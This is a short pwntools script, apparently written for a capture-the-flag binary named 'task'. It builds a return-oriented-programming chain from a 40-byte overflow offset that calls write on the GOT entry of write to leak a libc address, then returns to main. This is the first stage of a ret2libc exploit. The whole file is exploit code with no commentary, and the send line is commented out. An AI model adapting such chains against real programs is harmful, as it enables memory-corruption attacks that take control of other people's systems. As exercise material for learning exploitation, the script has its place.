from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'debug'

offset = 40

p = process()

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(1)
rop.raw(0x0000000000401271) # pop rsi ; pop r15 ; ret
rop.raw(elf.got.write)
rop.raw(0)
rop.raw(0x0000000000401250)

rop.raw(elf.sym.main)

print(rop.dump())

# p.send(rop.chain())
p.interactive()
